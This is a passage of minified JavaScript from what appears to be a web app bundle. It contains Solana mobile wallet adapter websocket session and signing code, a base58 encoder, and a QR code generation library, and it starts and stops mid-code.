o=(()=>{const h=[...FE.retryDelayScheduleMs];return()=>h.length>1?h.shift():h[0]})();let a=1,l=0,u={__type:"disconnected"};return new Promise((h,f)=>{let p;const w={},x=()=>hn(this,void 0,void 0,function*(){if(u.__type!=="connecting"){console.warn(`Expected adapter state to be \`connecting\` at the moment the websocket opens. Got \`${u.__type}\`.`);return}p.removeEventListener("open",x);const{associationKeypair:W}=u,q=yield mm();p.send(yield pm(q.publicKey,W.privateKey)),u={__type:"hello_req_sent",associationPublicKey:W.publicKey,ecdhPrivateKey:q.privateKey}}),k=W=>{W.wasClean?u={__type:"disconnected"}:f(new ps(ds.ERROR_SESSION_CLOSED,`The wallet session dropped unexpectedly (${W.code}: ${W.reason}).`,{closeEvent:W})),b()},I=W=>hn(this,void 0,void 0,function*(){b(),Date.now()-s>=FE.timeoutMs?f(new ps(ds.ERROR_SESSION_TIMEOUT,`Failed to connect to the wallet websocket at ${i}.`)):(yield new Promise(q=>{const L=o();E=window.setTimeout(q,L)}),O())}),A=W=>hn(this,void 0,void 0,function*(){const q=yield W.data.arrayBuffer();switch(u.__type){case"connecting":if(q.byteLength!==0)throw new Error("Encountered unexpected message while connecting");const L=yield mm();p.send(yield pm(L.publicKey,t.privateKey)),u={__type:"hello_req_sent",associationPublicKey:t.publicKey,ecdhPrivateKey:L.privateKey};break;case"connected":try{const N=q.slice(0,Go),B=zE(N);if(B!==l+1)throw new Error("Encrypted message has invalid sequence number");l=B;const z=yield iB(q,u.sharedSecret),$=w[z.id];delete w[z.id],$.resolve(z.result)}catch(N){if(N instanceof kx){const B=w[N.jsonRpcMessageId];delete w[N.jsonRpcMessageId],B.reject(N)}else throw N}break;case"hello_req_sent":{if(q.byteLength===0){const K=yield mm();p.send(yield pm(K.publicKey,t.privateKey)),u={__type:"hello_req_sent",associationPublicKey:t.publicKey,ecdhPrivateKey:K.privateKey};break}const N=yield sB(q,u.associationPublicKey,u.ecdhPrivateKey),B=q.slice(Cx),z=B.byteLength!==0?yield(()=>hn(this,void 0,void 0,function*(){const K=B.slice(0,Go),S=zE(K);if(S!==l+1)throw new Error("Encrypted message has invalid sequence number");return l=S,oB(B,N)}))():{protocol_version:"legacy"};u={__type:"connected",sharedSecret:N,sessionProperties:z};const $=Q3(z.protocol_version,(K,S)=>hn(this,void 0,void 0,function*(){const d=a++;return p.send(yield rB({id:d,jsonrpc:"2.0",method:K,params:S??{}},N)),new Promise((_,C)=>{w[d]={resolve(M){switch(K){case"authorize":case"reauthorize":{const{wallet_uri_base:R}=M;if(R!=null)try{_B(R)}catch(j){C(j);return}break}}_(M)},reject:C}})}));try{h(yield n($))}catch(K){f(K)}finally{b(),p.close()}break}}});let b,E;const O=()=>{b&&b(),u={__type:"connecting",associationKeypair:t},s===void 0&&(s=Date.now()),p=new WebSocket(i,[wB]),p.addEventListener("open",x),p.addEventListener("close",k),p.addEventListener("error",I),p.addEventListener("message",A),b=()=>{window.clearTimeout(E),p.removeEventListener("open",x),p.removeEventListener("close",k),p.removeEventListener("error",I),p.removeEventListener("message",A)}};O()})})}function IB(n){if(n.length>=255)throw new TypeError("Alphabet too long");for(var e=new Uint8Array(256),t=0;t<e.length;t++)e[t]=255;for(var r=0;r<n.length;r++){var i=n.charAt(r),s=i.charCodeAt(0);if(e[s]!==255)throw new TypeError(i+" is ambiguous");e[s]=r}var o=n.length,a=n.charAt(0),l=Math.log(o)/Math.log(256),u=Math.log(256)/Math.log(o);function h(w){if(w instanceof Uint8Array||(ArrayBuffer.isView(w)?w=new Uint8Array(w.buffer,w.byteOffset,w.byteLength):Array.isArray(w)&&(w=Uint8Array.from(w))),!(w instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(w.length===0)return"";for(var x=0,k=0,I=0,A=w.length;I!==A&&w[I]===0;)I++,x++;for(var b=(A-I)*u+1>>>0,E=new Uint8Array(b);I!==A;){for(var O=w[I],W=0,q=b-1;(O!==0||W<k)&&q!==-1;q--,W++)O+=256*E[q]>>>0,E[q]=O%o>>>0,O=O/o>>>0;if(O!==0)throw new Error("Non-zero carry");k=W,I++}for(var L=b-k;L!==b&&E[L]===0;)L++;for(var N=a.repeat(x);L<b;++L)N+=n.charAt(E[L]);return N}function f(w){if(typeof w!="string")throw new TypeError("Expected String");if(w.length===0)return new Uint8Array;for(var x=0,k=0,I=0;w[x]===a;)k++,x++;for(var A=(w.length-x)*l+1>>>0,b=new Uint8Array(A);w[x];){var E=w.charCodeAt(x);if(E>255)return;var O=e[E];if(O===255)return;for(var W=0,q=A-1;(O!==0||W<I)&&q!==-1;q--,W++)O+=o*b[q]>>>0,b[q]=O%256>>>0,O=O/256>>>0;if(O!==0)throw new Error("Non-zero carry");I=W,x++}for(var L=A-I;L!==A&&b[L]===0;)L++;for(var N=new Uint8Array(k+(A-L)),B=k;L!==A;)N[B++]=b[L++];return N}function p(w){var x=f(w);if(x)return x;throw new Error("Non-base"+o+" character")}return{encode:h,decodeUnsafe:f,decode:p}}var SB=IB;const TB=SB,AB="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";var bB=TB(AB);const xB=Eo(bB);function ym(n,e){var t={};for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&e.indexOf(r)<0&&(t[r]=n[r]);if(n!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,r=Object.getOwnPropertySymbols(n);i<r.length;i++)e.indexOf(r[i])<0&&Object.prototype.propertyIsEnumerable.call(n,r[i])&&(t[r[i]]=n[r[i]]);return t}function hf(n,e,t,r){function i(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(h){try{u(r.next(h))}catch(f){o(f)}}function l(h){try{u(r.throw(h))}catch(f){o(f)}}function u(h){h.done?s(h.value):i(h.value).then(a,l)}u((r=r.apply(n,e||[])).next())})}function Px(n){return window.btoa(String.fromCharCode.call(null,...n))}function wm(n){return new Uint8Array(window.atob(n).split("").map(e=>e.charCodeAt(0)))}function WE(n){const e="version"in n?n.serialize():n.serialize({requireAllSignatures:!1,verifySignatures:!1});return Px(e)}function kB(n){const t=n[0]*Fu+1;return ov.deserializeMessageVersion(n.slice(t,n.length))==="legacy"?mr.from(n):Wu.deserialize(n)}function CB(n,e){return hf(this,void 0,void 0,function*(){return yield EB(r=>{const i=new Proxy({},{get(s,o){if(s[o]==null)switch(o){case"signAndSendTransactions":s[o]=function(a){var{minContextSlot:l,commitment:u,skipPreflight:h,maxRetries:f,waitForCommitmentToSendNextTransaction:p,transactions:w}=a,x=ym(a,["minContextSlot","commitment","skipPreflight","maxRetries","waitForCommitmentToSendNextTransaction","transactions"]);return hf(this,void 0,void 0,function*(){const k=w.map(WE),I={min_context_slot:l,commitment:u,skip_preflight:h,max_retries:f,wait_for_commitment_to_send_next_transaction:p},{signatures:A}=yield r.signAndSendTransactions(Object.assign(Object.assign(Object.assign({},x),Object.values(I).some(E=>E!=null)?{options:I}:null),{payloads:k}));return A.map(wm).map(xB.encode)})};break;case"signMessages":s[o]=function(a){var{payloads:l}=a,u=ym(a,["payloads"]);return hf(this,void 0,void 0,function*(){const h=l.map(Px),{signed_payloads:f}=yield r.signMessages(Object.assign(Object.assign({},u),{payloads:h}));return f.map(wm)})};break;case"signTransactions":s[o]=function(a){var{transactions:l}=a,u=ym(a,["transactions"]);return hf(this,void 0,void 0,function*(){const h=l.map(WE),{signed_payloads:f}=yield r.signTransactions(Object.assign(Object.assign({},u),{payloads:h}));return f.map(wm).map(kB)})};break;default:{s[o]=r[o];break}}return s[o]},defineProperty(){return!1},deleteProperty(){return!1}});return n(i)},e)})}var RB=function(){return typeof Promise=="function"&&Promise.prototype&&Promise.prototype.then},Lx={},Or={};let mv;const MB=[0,26,44,70,100,134,172,196,242,292,346,404,466,532,581,655,733,815,901,991,1085,1156,1258,1364,1474,1588,1706,1828,1921,2051,2185,2323,2465,2611,2761,2876,3034,3196,3362,3532,3706];Or.getSymbolSize=function(e){if(!e)throw new Error('"version" cannot be null or undefined');if(e<1||e>40)throw new Error('"version" should be in range from 1 to 40');return e*4+17};Or.getSymbolTotalCodewords=function(e){return MB[e]};Or.getBCHDigit=function(n){let e=0;for(;n!==0;)e++,n>>>=1;return e};Or.setToSJISFunction=function(e){if(typeof e!="function")throw new Error('"toSJISFunc" is not a valid function.');mv=e};Or.isKanjiModeEnabled=function(){return typeof mv<"u"};Or.toSJIS=function(e){return mv(e)};var jp={};(function(n){n.L={bit:1},n.M={bit:0},n.Q={bit:3},n.H={bit:2};function e(t){if(typeof t!="string")throw new Error("Param is not a string");switch(t.toLowerCase()){case"l":case"low":return n.L;case"m":case"medium":return n.M;case"q":case"quartile":return n.Q;case"h":case"high":return n.H;default:throw new Error("Unknown EC Level: "+t)}}n.isValid=function(r){return r&&typeof r.bit<"u"&&r.bit>=0&&r.bit<4},n.from=function(r,i){if(n.isValid(r))return r;try{return e(r)}catch{return i}}})(jp);function Dx(){this.buffer=[],this.length=0}Dx.prototype={get:function(n){const e=Math.floor(n/8);return(this.buffer[e]>>>7-n%8&1)===1},put:function(n,e){for(let t=0;t<e;t++)this.putBit((n>>>e-t-1&1)===1)},getLengthInBits:function(){return this.length},putBit:function(n){const e=Math.floor(this.length/8);this.buffer.length<=e&&this.buffer.push(0),n&&(this.buffer[e]|=128>>>this.length%8),this.length++}};var NB=Dx;function gh(n){if(!n||n<1)throw new Error("BitMatrix size must be defined and greater than 0");this.size=n,this.data=new Uint8Array(n*n),this.reservedBit=new Uint8Array(n*n)}gh.prototype.set=function(n,e,t,r){const i=n*this.size+e;this.data[i]=t,r&&(this.reservedBit[i]=!0)};gh.prototype.get=function(n,e){return this.data[n*this.size+e]};gh.prototype.xor=function(n,e,t){this.data[n*this.size+e]^=t};gh.prototype.isReserved=function(n,e){return this.reservedBit[n*this.size+e]};var PB=gh,Ox={};(function(n){const e=Or.getSymbolSize;n.getRowColCoords=function(r){if(r===1)return[];const i=Math.floor(r/7)+2,s=e(r),o=s===145?26:Math.ceil((s-13)/(2*i-2))*2,a=[s-7];for(let l=1;l<i-1;l++)a[l]=a[l-1]-o;return a.push(6),a.reverse()},n.getPositions=function(r){const i=[],s=n.getRowColCoords(r),o=s.length;for(let a=0;a<o;a++)for(let l=0;l<o;l++)a===0&&l===0||a===0&&l===o-1||a===o-1&&l===0||i.push([s[a],s[l]]);return i}})(Ox);var Bx={};const LB=Or.getSymbolSize,$E=7;Bx.getPositions=function(e){const t=LB(e);return[[0,0],[t-$E,0],[0,t-$E]]};var Ux={};(function(n){n.Patterns={PATTERN000:0,PATTERN001:1,PATTERN010:2,PATTERN011:3,PATTERN100:4,PATTERN101:5,PATTERN110:6,PATTERN111:7};const e={N1:3,N2:3,N3:40,N4:10};n.isValid=function(i){return i!=null&&i!==""&&!isNaN(i)&&i>=0&&i<=7},n.from=function(i){return n.isValid(i)?parseInt(i,10):void 0},n.getPenaltyN1=function(i){const s=i.size;let o=0,a=0,l=0,u=null,h=null;for(let f=0;f<s;f++){a=l=0,u=h=null;for(let p=0;p<s;p++){let w=i.get(f,p);w===u?a++:(a>=5&&(o+=e.N1+(a-5)),u=w,a=1),w=i.get(p,f),w===h?l++:(l>=5&&(o+=e.N1+(l-5)),h=w,l=1)}a>=5&&(o+=e.N1+(a-5)),l>=5&&(o+=e.N1+(l-5))}return o},n.getPenaltyN2=function(i){const s=i.size;let o=0;for(let a=0;a<s-1;a++)for(let l=0;l<s-1;l++){const u=i.get(a,l)+i.get(a,l+1)+i.get(a+1,l)+i.get(a+1,l+1);(u===4||u===0)&&o++}return o*e.N2},n.getPenaltyN3=function(i){const s=i.size;let o=0,a=0,l=0;for(let u=0;u<s;u++){a=l=0;for(let h=0;h<s;h++)a=a<<1&2047|i.get(u,h),h>=10&&(a===1488||a===93)&&o++,l=l<<1&2047|i.get(h,u),h>=10&&(l===1488||l===93)&&o++}return o*e.N3},n.getPenaltyN4=function(i){let s=0;const o=i.data.length;for(let l=0;l<o;l++)s+=i.data[l];return Math.abs(Math.ceil(s*100/o/5)-10)*e.N4};function t(r,i,s){switch(r){case n.Patterns.PATTERN000:return(i+s)%2===0;case n.Patterns.PATTERN001:return i%2===0;case n.Patterns.PATTERN010:return s%3===0;case n.Patterns.PATTERN011:return(i+s)%3===0;case n.Patterns.PATTERN100:return(Math.floor(i/2)+Math.floor(s/3))%2===0;case n.Patterns.PATTERN101:return i*s%2+i*s%3===0;case n.Patterns.PATTERN110:return(i*s%2+i*s%3)%2===0;case n.Patterns.PATTERN111:return(i*s%3+(i+s)%2)%2===0;default:throw new Error("bad maskPattern:"+r)}}n.applyMask=function(i,s){const o=s.size;for(let a=0;a<o;a++)for(let l=0;l<o;l++)s.isReserved(l,a)||s.xor(l,a,t(i,l,a))},n.getBestMask=function(i,s){const o=Object.keys(n.Patterns).length;let a=0,l=1/0;for(let u=0;u<o;u++){s(u),n.applyMask(u,i);const h=n.getPenaltyN1(i)+n.getPenaltyN2(i)+n.getPenaltyN3(i)+n.getPenaltyN4(i);n.applyMask(u,i),h<l&&(l=h,a=u)}return a}})(Ux);var Vp={};const Ks=jp,ff=[1,1,1,1,1,1,1,1,1,1,2,2,1,2,2,4,1,2,4,4,2,4,4,4,2,4,6,5,2,4,6,6,2,5,8,8,4,5,8,8,4,5,8,11,4,8,10,11,4,9,12,16,4,9,16,16,6,10,12,18,6,10,17,16,6,11,16,19,6,13,18,21,7,14,21,25,8,16,20,25,8,17,23,25,9,17,23,34,9,18,25,30,10,20,27,32,12,21,29,35,12,23,34,37,12,25,34,40,13,26,35,42,14,28,38,45,15,29,40,48,16,31,43,51,17,33,45,54,18,35,48,57,19,37,51,60,19,38,53,63,20,40,56,66,21,43,59,70,22,45,62,74,24,47,65,77,25,49,68,81],df=[7,10,13,17,10,16,22,28,15,26,36,44,20,36,52,64,26,48,72,88,36,64,96,112,40,72,108,130,48,88,132,156,60,110,160,192,72,130,192,224,80,150,224,264,96,176,260,308,104,198,288,352,120,216,320,384,132,240,360,432,144,280,408,480,168,308,448,532,180,338,504,588,196,364,546,650,224,416,600,700,224,442,644,750,252,476,690,816,270,504,750,900,300,560,810,960,312,588,870,1050,336,644,952,1110,360,700,1020,1200,390,728,1050,1260,420,784,1140,1350,450,812,1200,1440,480,868,1290,1530,510,924,1350,1620,540,980,1440,1710,570,1036,1530,1800,570,1064,1590,1890,600,1120,1680,1980,630,1204,1770,2100,660,1260,1860,2220,720,1316,1950,2310,750,1372,2040,2430];Vp.getBlocksCount=function(e,t){switch(t){case Ks.L:return ff[(e-1)*4+0];case Ks.M:return ff[(e-1)*4+1];case Ks.Q:return ff[(e-1)*4+2];case Ks.H:return ff[(e-1)*4+3];default:return}};Vp.getTotalCodewordsCount=function(e,t){switch(t){case Ks.L:return df[(e-1)*4+0];case Ks.M:return df[(e-1)*4+1];case Ks.Q:return df[(e-1)*4+2];case Ks.H:return df[(e-1)*4+3];default:return}};var jx={},Fp={};const uu=new Uint8Array(512),Md=new Uint8Array(256);(function(){let e=1;for(let t=0;t<255;t++)uu[t]=e,Md[e]=t,e<<=1,e&256&&(e^=285);for(let t=255;t<512;t++)uu[t]=uu[t-255]})();Fp.log=function(e){if(e<1)throw new Error("log("+e+")");return Md[e]};Fp.exp=function(e){return uu[e]};Fp.mul=function(e,t){return e===0||t===0?0:uu[Md[e]+Md[t]]};(function(n){const e=Fp;n.mul=function(r,i){const s=new Uint8Array(r.length+i.length-1);for(let o=0;o<r.length;o++)for(let a=0;a<i.length;a++)s[o+a]^=e.mul(r[o],i[a]);return s},n.mod=function(r,i){let s=new Uint8Array(r);for(;s.length-i.length>=0;){const o=s[0];for(let l=0;l<i.length;l++)s[l]^=e.mul(i[l],o);let a=0;for(;a<s.length&&s[a]===0;)a++;s=s.slice(a)}return s},n.generateECPolynomial=function(r){let i=new Uint8Array([1]);for(let s=0;s<r;s++)i=n.mul(i,new Uint8Array([1,e.exp(s)]));return i}})(jx);const Vx=jx;function yv(n){this.genPoly=void 0,this.degree=n,this.degree&&this.initialize(this.degree)}yv.prototype.initialize=function(e){this.degree=e,this.genPoly=Vx.generateECPolynomial(this.degree)};yv.prototype.encode=function(e){if(!this.genPoly)throw new Error("Encoder not initialized");const t=new Uint8Array(e.length+this.degree);t.set(e);const r=Vx.mod(t,this.genPoly),i=this.degree-r.length;if(i>0){const s=new Uint8Array(this.degree);return s.set(r,i),s}return r};var DB=yv,Fx={},Ao={},wv={};wv.isValid=function(e){return!isNaN(e)&&e>=1&&e<=40};var Ui={};const zx="[0-9]+",OB="[A-Z $%*+\\-./:]+";let Hu="(?:[u3000-u303F]|[u3040-u309F]|[u30A0-u30FF]|[uFF00-uFFEF]|[u4E00-u9FAF]|[u2605-u2606]|[u2190-u2195]|u203B|[u2010u2015u2018u2019u2025u2026u201Cu201Du2225u2260]|[u0391-u0451]|[u00A7u00A8u00B1u00B4u00D7u00F7])+";Hu=Hu.replace(/u/g,"\\u");const BB="(?:(?![A-Z0-9 $%*+\\-./:]|"+Hu+`)(?:.|[\r
]))+`;Ui.KANJI=new RegExp(Hu,"g");Ui.BYTE_KANJI=new RegExp("[^A-Z0-9 $%*+\\-./:]+","g");Ui.BYTE=new RegExp(BB,"g");Ui.NUMERIC=new RegExp(zx,"g");Ui.ALPHANUMERIC=new RegExp(OB,"g");const UB=new RegExp("^"+Hu+"$"),jB=new RegExp("^"+zx+"$"),VB=new RegExp("^[A-Z0-9 $%*+\\-./:]+$");Ui.testKanji=function(e){return UB.test(e)};Ui.testNumeric=function(e){return jB.test(e)};Ui.testAlphanumeric=function(e){return VB.test(e)};(function(n){const e=wv,t=Ui;n.NUMERIC={id:"Numeric",bit:1,ccBits:[10,12,14]},n.ALPHANUMERIC={id:"Alphanumeric",bit:2,ccBits:[9,11,13]},n.BYTE={id:"Byte",bit:4,ccBits:[8,16,16]},n.KANJI={id:"Kanji",bit:8,ccBits:[8,10,12]},n.MIXED={bit:-1},n.getCharCountIndicator=function(s,o){if(!s.ccBits)throw new Error("Invalid mode: "+s);if(!e.isValid(o))throw new Error("Invalid version: "+o);return o>=1&&o<10?s.ccBits[0]:o<27?s.ccBits[1]:s.ccBits[2]},n.getBestModeForData=function(s){return t.testNumeric(s)?n.NUMERIC:t.testAlphanumeric(s)?n.ALPHANUMERIC:t.testKanji(s)?n.KANJI:n.BYTE},n.toString=function(s){if(s&&s.id)return s.id;throw new Error("Invalid mode")},n.isValid=function(s){return s&&s.bit&&s.ccBits};function r(i){if(typeof i!="string")throw new Error("Param is not a string");switch(i.toLowerCase()){case"numeric":return n.NUMERIC;case"alphanumeric":return n.ALPHANUMERIC;case"kanji":return n.KANJI;case"byte":return n.BYTE;default:throw new Error("Unknown mode: "+i)}}n.from=function(s,o){if(n.isValid(s))return s;try{return r(s)}catch{return o}}})(Ao);(function(n){const e=Or,t=Vp,r=jp,i=Ao,s=wv,o=7973,a=e.getBCHDigit(o);function l(p,w,x){for(let k=1;k<=40;k++)if(w<=n.getCapacity(k,x,p))return k}function u(p,w){return i.getCharCountIndicator(p,w)+4}function h(p,w){let x=0;return p.forEach(function(k){const I=u(k.mode,w);x+=I+k.getBitsLength()}),x}function f(p,w){for(let x=1;x<=40;x++)if(h(p,x)<=n.getCapacity(x,w,i.MIXED))return x}n.from=function(w,x){return s.isValid(w)?parseInt(w,10):x},n.getCapacity=function(w,x,k){if(!s.isValid(w))throw new Error("Invalid QR Code version");typeof k>"u"&&(k=i.BYTE);const I=e.getSymbolTotalCodewords(w),A=t.getTotalCodewordsCount(w,x),b=(I-A)*8;if(k===i.MIXED)return b;const E=b-u(k,w);switch(k){case i.NUMERIC:return Math.floor(E/10*3);case i.ALPHANUMERIC:return Math.floor(E/11*2);case i.KANJI:return Math.floor(E/13);case i.BYTE:default:return Math.floor(E/8)}},n.getBestVersionForData=function(w,x){let k;const I=r.from(x,r.M);if(Array.isArray(w)){if(w.length>1)return f(w,I);if(w.length===0)return 1;k=w[0]}else k=w;return l(k.mode,k.getLength(),I)},n.getEncodedBits=function(w){if(!s.isValid(w)||w<7)throw new Error("Invalid QR Code version");let x=w<<12;for(;e.getBCHDigit(x)-a>=0;)x^=o<<e.getBCHDigit(x)-a;return w<<12|x}})(Fx);var Wx={};const Y0=Or,$x=1335,FB=21522,HE=Y0.getBCHDigit($x);Wx.getEncodedBits=function(e,t){const r=e.bit<<3|t;let i=r<<10;for(;Y0.getBCHDigit(i)-HE>=0;)i^=$x<<Y0.getBCHDigit(i)-HE;return(r<<10|i)^FB};var Hx={};const zB=Ao;function Fl(n){this.mode=zB.NUMERIC,this.data=n.toString()}Fl.getBitsLength=function(e){return 10*Math.floor(e/3)+(e%3?e%3*3+1:0)};Fl.prototype.getLength=function(){return this.data.length};Fl.prototype.getBitsLength=function(){return Fl.getBitsLength(this.data.length)};Fl.prototype.write=function(e){let t,r,i;for(t=0;t+3<=this.data.length;t+=3)r=this.data.substr(t,3),i=parseInt(r,10),e.put(i,10);const s=this.data.length-t;s>0&&(r=this.data.substr(t),i=parseInt(r,10),e.put(i,s*3+1))};var WB=Fl;const $B=Ao,vm=["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"," ","$","%","*","+","-",".","/",":"];function zl(n){this.mode=$B.ALPHANUMERIC,this.data=n}zl.getBitsLength=function(e){return 11*Math.floor(e/2)+6*(e%2)};zl.prototype.getLength=function(){return this.data.length};zl.prototype.getBitsLength=function(){return zl.getBitsLength(this.data.length)};zl.prototype.write=function(e){let t;for(t=0;t+2<=this.data.length;t+=2){let r=vm.indexOf(this.data[t])*45;r+=vm.indexOf(this.data[t+1]),e.put(r,11)}this.data.length%2&&e.put(vm.indexOf(this.data[t]),6)};var HB=zl;const qB=Ao;function Wl(n){this.mode=qB.BYTE,typeof n=="string"?this.data=new TextEncoder().encode(n):this.data=new Uint8Array(n)}Wl.getBitsLength=function(e){return e*8};Wl.prototype.getLength=function(){return this.data.length};Wl.prototype.getBitsLength=function(){return Wl.getBitsLength(this.data.length)};Wl.prototype.write=function(n){for(let e=0,t=this.data.length;e<t;e++)n.put(this.data[e],8)};var KB=Wl;const GB=Ao,QB=Or;function $l(n){this.mode=GB.KANJI,this.data=n}$l.getBitsLength=function(e){return e*13};$l.prototype.getLength=function(){return this.data.length};$l.prototype.getBitsLength=function(){return $l.getBitsLength(this.data.length)};$l.prototype.write=function(n){let e;for(e=0;e<this.data.length;e++){let t=QB.toSJIS(this.data[e]);if(t>=33088&&t<=40956)t-=33088;else if(t>=57408&&t<=60351)t-=49472;else throw new Error("Invalid SJIS character: "+this.data[e]+`
Make sure your charset is UTF-8`);t=(t>>>8&255)*192+(t&255),n.put(t,13)}};var YB=$l,qx={exports:{}};(function(n){var e={single_source_shortest_paths:function(t,r,i){var s={},o={};o[r]=0;var a=e.PriorityQueue.make();a.push(r,0);for(var l,u,h,f,p,w,x,k,I;!a.empty();){l=a.pop(),u=l.value,f=l.cost,p=t[u]||{};for(h in p)p.hasOwnProperty(h)&&(w=p[h],x=f+w,k=o[h],I=typeof o[h]>"u",(I||k>x)&&(o[h]=x,a.push(h,x),s[h]=u))}if(typeof i<"u"&&typeof o[i]>"u"){var A=["Could not find a path from ",r," to ",i,"."].join("");throw new Error(A)}return s},extract_shortest_path_from_predecessor_list:function(t,r){for(var i=[],s=r;s;)i.push(s),t[s],s=t[s];return i.reverse(),i},find_path:function(t,r,i){var s=e.single_source_shortest_paths(t,r,i);return e.extract_shortest_path_from_predecessor_list(s,i)},PriorityQueue:{make:function(t){var r=e.PriorityQueue,i={},s;t=t||{};for(s in r)r.hasOwnProperty(s)&&(i[s]=r[s]);return i.queue=[],i.sorter=t.sorter||r.default_sorter,i},default_sorter:function(t,r){return t.cost-r.cost},push:function(t,r){var i={value:t,cost:r};this.queue.push(i),this.queue.sort(this.sorter)},pop:function(){return this.queue.shift()},empty:function(){return this.queue.length===0}}};n.exports=e})(qx);var ZB=qx.exports;(function(n){const e=Ao,t=WB,r=HB,i=KB,s=YB,o=Ui,a=Or,l=ZB;function u(A){return unescape(encodeURIComponent(A)).length}function h(A,b,E){const O=[];let W;for(;(W=A.exec(E))!==null;)O.push({data:W[0],index:W.index,mode:b,length:W[0].length});return O}function f(A){const b=h(o.NUMERIC,e.NUMERIC,A),E=h(o.ALPHANUMERIC,e.ALPHANUMERIC,A);let O,W;return a.isKanjiModeEnabled()?(O=h(o.BYTE,e.BYTE,A),W=h(o.KANJI,e.KANJI,A)):(O=h(o.BYTE_KANJI,e.BYTE,A),W=[]),b.concat(E,O,W).sort(function(L,N){return L.index-N.index}).map(function(L){return{data:L.data,mode:L.mode,length:L.length}})}function p(A,b){switch(b){case e.NUMERIC:return t.getBitsLength(A);case e.ALPHANUMERIC:return r.getBitsLength(A);case e.KANJI:return s.getBitsLength(A);case e.BYTE:return i.getBitsLength(A)}}function w(A){return A.reduce(function(b,E){const O=b.length-1>=0?b[b.length-1]:null;return O&&O.mode===E.mode?(b[b.length-1].data+=E.data,b):(b.push(E),b)},[])}function x(A){const b=[];for(let E=0;E<A.length;E++){const O=A[E];switch(O.mode){case e.NUMERIC:b.push([O,{data:O.data,mode:e.ALPHANUMERIC,length:O.length},{data:O.data,mode:e.BYTE,length:O.length}]);break;case e.ALPHANUMERIC:b.push([O,{data:O.data,mode:e.BYTE,length:O.length}]);break;case e.KANJI:b.push([O,{data:O.data,mode:e.BYTE,length:u(O.data)}]);break;case e.BYTE:b.push([{data:O.data,mode:e.BYTE,length:u(O.data)}])}}return b}function k(A,b){const E={},O={start:{}};let W=["start"];for(let q=0;q<A.length;q++){const L=A[q],N=[];for(let B=0;B<L.length;B++){const z=L[B],$=""+q+B;N.push($),E[$]={node:z,lastCount:0},O[$]={};for(let K=0;K<W.length;K++){const S=W[K];E[S]&&E[S].node.mode===z.mode?(O[S][$]=p(E[S].lastCount+z.length,z.mode)-p(E[S].lastCount,z.mode),E[S].lastCount+=z.length):(E[S]&&(E[S].lastCount=z.length),O[S][$]=p(z.length,z.mode)+4+e.getCharCountIndicator(z.mode,b))}}W=N}for(let q=0;q<W.length;q++)O[W[q]].end=0;return{map:O,table:E}}function I(A,b){let E;const O=e.getBestModeForData(A);if(E=e.from(b,O),E!==e.BYTE&&E.bit<O.bit)throw new Error('"'+A+'" cannot be encoded with mode '+e.toString(E)+`.
 Suggested mode is: `+e.toString(O));switch(E===e.KANJI&&!a.isKanjiModeEnabled()&&(E=e.BYTE),E){case e.NUMERIC:return new t(A);case e.ALPHANUMERIC:return new r(A);case e.KANJI:return new s(A);case e.BYTE:return new i(A)}}n.fromArray=function(b){return b.reduce(function(E,O){return typeof O=="string"?E.push(I(O,null)):O.data&&E.push(I(O.data,O.mode)),E},[])},n.fromString=function(b,E){const O=f(b,a.isKanjiModeEnabled()),W=x(O),q=k(W,E),L=l.find_path(q.map,"start","end"),N=[];for(let B=1;B<L.length-1;B++)N.push(q.table[L[B]].node);return n.fromArray(w(N))},n.rawSplit=function(b){return n.fromArray(f(b,a.isKanjiModeEnabled()))}})(Hx);const zp=Or,_m=jp,JB=NB,XB=PB,e6=Ox,t6=Bx,Z0=Ux,J0=Vp,n6=DB,Nd=Fx,r6=Wx,i6=Ao,Em=Hx;function s6(n,e){const t=n.size,r=t6.getPositions(e);for(let i=0;i<r.length;i++){const s=r[i][0],o=r[i][1];for(let a=-1;a<=7;a++)if(!(s+a<=-1||t<=s+a))for(let l=-1;l<=7;l++)o+l<=-1||t<=o+l||(a>=0&&a<=6&&(l===0||l===6)||l>=0&&l<=6&&(a===0||a===6)||a>=2&&a<=4&&l>=2&&l<=4?n.set(s+a,o+l,!0,!0):n.set(s+a,o+l,!1,!0))}}function o6(n){const e=n.size;for(let t=8;t<e-8;t++){const r=t%2===0;n.set(t,6,r,!0),n.set(6,t,r,!0)}}function a6(n,e){const t=e6.getPositions(e);for(let r=0;r<t.length;r++){const i=t[r][0],s=t[r][1];for(let o=-2;o<=2;o++)for(let a=-2;a<=2;a++)o===-2||o===2||a===-2||a===2||o===0&&a===0?n.set(i+o,s+a,!0,!0):n.set(i+o,s+a,!1,!0)}}function l6(n,e){const t=n.size,r=Nd.getEncodedBits(e);let i,s,o;for(let a=0;a<18;a++)i=Math.floor(a/3),s=a%3+t-8-3,o=(r>>a&1)===1,n.set(i,s,o,!0),n.set(s,i,o,!0)}function Im(n,e,t){const r=n.size,i=r6.getEncodedBits(e,t);let s,o;for(s=0;s<15;s++)o=(i>>s&1)===1,s<6?n.set(s,8,o,!0):s<8?n.set(s+1,8,o,!0):n.set(r-15+s,8,o,!0),s<8?n.set(8,r-s-1,o,!0):s<9?n.set(8,15-s-1+1,o,!0):n.set(8,15-s-1,o,!0);n.set(r-8,8,1,!0)}function c6(n,e){const t=n.size;let r=-1,i=t-1,s=7,o=0;for(let a=t-1;a>0;a-=2)for(a===6&&a--;;){for(let l=0;l<2;l++)if(!n.isReserved(i,a-l)){let u=!1;o<e.length&&(u=(e[o]>>>s&1)===1),n.set(i,a-l,u),s--,s===-1&&(o++,s=7)}if(i+=r,i<0||t<=i){i-=r,r=-r;break}}}function u6(n,e,t){const r=new JB;t.forEach(function(l){r.put(l.mode.bit,4),r.put(l.getLength(),i6.getCharCountIndicator(l.mode,n)),l.write(r)});const i=zp.getSymbolTotalCodewords(n),s=J0.getTotalCodewordsCount(n,e),o=(i-s)*8;for(r.getLengthInBits()+4<=o&&r.put(0,4);r.getLengthInBits()%8!==0;)r.putBit(0);const a=(o-r.getLengthInBits())/8;for(let l=0;l<a;l++)r.put(l%2?17:236,8);return h6(r,n,e)}function h6(n,e,t){const 